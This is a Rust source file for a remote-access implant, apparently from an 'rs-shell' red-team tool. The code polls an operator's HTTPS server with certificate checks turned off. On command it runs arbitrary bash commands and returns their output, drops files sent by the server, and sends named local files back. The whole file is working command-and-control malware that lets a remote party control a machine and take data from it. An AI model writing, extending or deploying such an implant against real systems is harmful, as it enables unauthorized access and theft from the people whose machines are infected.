use reqwest::{blocking::multipart, blocking::Client};
use std::fs::File;
use std::io::Write;
use std::{error::Error, path::Path, process::Command};
use std::{thread, time};

fn do_stuff(cmd: &str) -> Vec<u8> {
    let exec = Command::new("/bin/bash")
        .args(["-c", cmd.trim_end_matches("\r\n")])
        .output()
        .unwrap();

    let stdo = exec.stdout.as_slice();
    let _stdr = exec.stderr.as_slice();

    if _stdr.is_empty() {
        stdo.to_vec()
    } else {
        _stdr.to_vec()
    }
}

pub fn implant(ip: &str) -> Result<(), Box<dyn Error>> {
    // HTTPS implant without certificate verification
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let mut url = format!("https://{}/rs-shell/index", ip);
    // Connect to the server and get the banner
    let mut response = client.get(url).send()?;
    if response.status().is_success() {
        log::debug!("Session initialized");

        let os = std::env::consts::FAMILY;
        url = format!("https://{}/rs-shell/os", ip);
        response = client.post(url).body(os).send()?;
        if response.status().is_success() {
            log::debug!("OS send");
        } else {
            log::debug!("HTTP error: {}", response.status());
        }

        loop {
            // Get the next task
            url = format!("https://{}/rs-shell/next_task", ip);
            response = client.get(url).send()?;
            if response.status().is_success() {
                let res = response.text()?.to_string();
                log::debug!("Task: {}", res);
                let (cmd, value) = match res.split_once(':') {
                    Some((cmd, value)) => (cmd, value),
                    None => (res.as_str(), ""),
                };

                match cmd {
                    "cmd" => {
                        let res_cmd = do_stuff(value);
                        log::debug!("{}", String::from_utf8_lossy(&res_cmd));
                        url = format!("https://{}/rs-shell/output_imp", ip);
                        response = client.post(url).body(res_cmd).send()?;
                        if response.status().is_success() {
                            log::debug!("Command executed");
                        } else {
                            log::debug!("HTTP error: {}", response.status());
                        }
                    }
                    "upload" => {
                        let url = format!("https://{}/rs-shell/upload{}", ip, value);
                        let response = client.get(url).send()?;
                        if response.status().is_success() {
                            let path = Path::new(value.trim());
                            File::create(path.file_name().unwrap().to_str().unwrap())
                                .unwrap()
                                .write_all(response.bytes().unwrap().to_vec().as_slice())?;
                            log::debug!("Uploaded file into ./");
                        } else {
                            log::debug!("HTTP error uploading file: {}", response.status());
                        }
                    }
                    "download" => {
                        let url = format!("https://{}/", ip);
                        match multipart::Form::new().file("file", value.trim_end_matches("\n")) {
                            Ok(form) => {
                                response = client.post(url).multipart(form).send()?;
                                if response.status().is_success() {
                                    log::debug!("Downloaded file: {}", value);
                                } else {
                                    log::debug!(
                                        "HTTP error downloading file: {}",
                                        response.status()
                                    );
                                }
                            }
                            Err(e) => log::debug!("Error: {}", e),
                        }
                    }
                    "No task" => {
                        log::debug!("No task");
                    }
                    "exit" | "quit" => {
                        log::debug!("Exiting...");
                        break;
                    }
                    _ => log::debug!("Unknown command"),
                }
            } else {
                log::debug!("Error obtaining new task: {}", response.status());
                continue;
            }
            // For the moment the implant sleeps 3 seconds between each request, could be interesting to randomize this value
            // Or setup an option to change it via the CLI
            thread::sleep(time::Duration::from_secs(2));
        }
    } else {
        log::debug!("RS-Shell server cannot be reached: {}", response.status());
    }

    Ok(())
}
